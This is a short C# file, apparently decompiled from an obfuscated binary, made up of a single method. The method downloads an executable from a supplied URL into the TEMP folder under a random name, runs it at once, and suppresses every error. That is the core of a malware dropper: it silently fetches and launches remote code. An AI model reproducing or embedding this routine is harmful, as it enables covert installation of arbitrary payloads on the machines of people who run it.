using System;
using System.Diagnostics;
using System.Net;

internal sealed class Class1
{
	public static void smethod_0(string string_0)
	{
		try
		{
			WebClient webClient = new WebClient();
			string text = Class9.smethod_0(11) + ".exe";
			webClient.DownloadFile(string_0, Environment.GetEnvironmentVariable("TEMP") + "\\" + text);
			Process process = new Process();
			process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\" + text;
			process.Start();
		}
		catch
		{
		}
	}
}
